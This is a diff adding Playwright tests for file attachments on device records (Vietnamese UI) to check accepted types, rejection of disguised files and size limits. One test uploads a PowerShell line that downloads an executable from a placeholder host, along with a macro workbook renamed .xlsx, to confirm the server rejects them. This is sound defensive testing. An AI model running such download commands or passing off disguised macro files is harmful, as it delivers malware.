@@ -2,6 +2,7 @@ import { writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { expect, test, type Page } from '@playwright/test';
+import JSZip from 'jszip';
 import {
   APP_ORIGIN,
   confirmAction,
@@ -141,5 +142,95 @@ test.describe('Giấy tờ đính kèm thiết bị', () => {
 
     const response = await page.request.get(`/api/v1/files/${fileId}/download`);
     expect(response.status()).toBe(404);
+  });
+});
+
+/** Gói OOXML tối thiểu: `[Content_Types].xml` khai phần chính + chính phần đó. */
+async function ooxml(part: string, contentType: string): Promise<Buffer> {
+  const zip = new JSZip();
+  zip.file(
+    '[Content_Types].xml',
+    '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">' +
+      `<Override PartName="/${part}" ContentType="${contentType}"/></Types>`,
+  );
+  zip.file(part, '<root/>');
+  return zip.generateAsync({ type: 'nodebuffer', compression: 'DEFLATE' });
+}
+
+const DOCX_MAIN = 'application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml';
+const XLSM_MAIN = 'application/vnd.ms-excel.sheet.macroEnabled.main+xml';
+
+test.describe('Giấy tờ đính kèm — loại file và trần (Q-18)', () => {
+  test('đường hạnh phúc: Word (docx) đính kèm được; câu gợi ý nói trần', async ({ page }) => {
+    await firstLogin(page, E2E_SA);
+    const stamp = uniqueStamp();
+    const deviceId = await createDevice(page, `SRV-E2E-DOCX-${stamp}`);
+
+    await page.goto(`/devices/${deviceId}`);
+    await page.getByRole('tab', { name: 'Giấy tờ' }).click();
+    await expect(page.getByText(/Tối đa \d+ MB\/file, \d+ file mỗi lần — PDF, Word, Excel, PowerPoint, ảnh/)).toBeVisible();
+    await page.getByLabel('Chọn file để đính kèm').setInputFiles({
+      name: `bien-ban-${stamp}.docx`,
+      mimeType: 'application/octet-stream',
+      buffer: await ooxml('word/document.xml', DOCX_MAIN),
+    });
+    await expect(page.getByRole('row', { name: new RegExp(`bien-ban-${stamp}`) })).toBeVisible();
+  });
+
+  test('đòn: xlsm đổi tên .xlsx và script .ps1 đổi tên .docx bị server từ chối theo nội dung', async ({
+    page,
+  }) => {
+    await firstLogin(page, E2E_SA);
+    const stamp = uniqueStamp();
+    const deviceId = await createDevice(page, `SRV-E2E-MACRO-${stamp}`);
+    const csrf = await page.evaluate(async () => {
+      const res = await fetch('/api/v1/auth/me', { credentials: 'include' });
+      return ((await res.json()) as { csrfToken: string }).csrfToken;
+    });
+    const send = (name: string, buffer: Buffer) =>
+      page.request.post('/api/v1/files', {
+        headers: { 'X-CSRF-Token': csrf, Origin: APP_ORIGIN },
+        multipart: {
+          ownerType: 'device',
+          ownerId: deviceId,
+          file: { name, mimeType: 'application/octet-stream', buffer },
+        },
+      });
+
+    for (const [name, buffer] of [
+      ['bang-luong.xlsx', await ooxml('xl/workbook.xml', XLSM_MAIN)],
+      ['bien-ban.docx', Buffer.from('Invoke-WebRequest http://x/y.exe -OutFile y.exe')],
+    ] as const) {
+      const res = await send(name, buffer);
+      expect(res.status()).toBe(400);
+      expect(((await res.json()) as { code: string }).code).toBe('UNSUPPORTED_FILE');
+    }
+  });
+
+  test('đường hỏng: file quá trần bị chặn ngay ở trình duyệt, không gửi lên', async ({ page }) => {
+    await firstLogin(page, E2E_SA);
+    const stamp = uniqueStamp();
+    const deviceId = await createDevice(page, `SRV-E2E-BIG-${stamp}`);
+    const maxMb = await page.evaluate(async () => {
+      const res = await fetch('/api/v1/auth/me', { credentials: 'include' });
+      return ((await res.json()) as { config: { fileMaxSizeMb: number } }).config.fileMaxSizeMb;
+    });
+
+    await page.goto(`/devices/${deviceId}`);
+    await page.getByRole('tab', { name: 'Giấy tờ' }).click();
+    let posted = false;
+    page.on('request', (request) => {
+      if (request.method() === 'POST' && request.url().includes('/api/v1/files')) posted = true;
+    });
+    const big = Buffer.alloc((maxMb + 1) * 1024 * 1024, 0x20);
+    big.write('%PDF-1.4\n', 0);
+    await page.getByLabel('Chọn file để đính kèm').setInputFiles({
+      name: `qua-co-${stamp}.pdf`,
+      mimeType: 'application/pdf',
+      buffer: big,
+    });
+    await expect(page.getByRole('alert')).toContainText(`vượt ${maxMb} MB mỗi file`);
+    await expect(page.getByText('Chưa có giấy tờ nào.')).toBeVisible();
+    expect(posted).toBe(false);
   });
 });
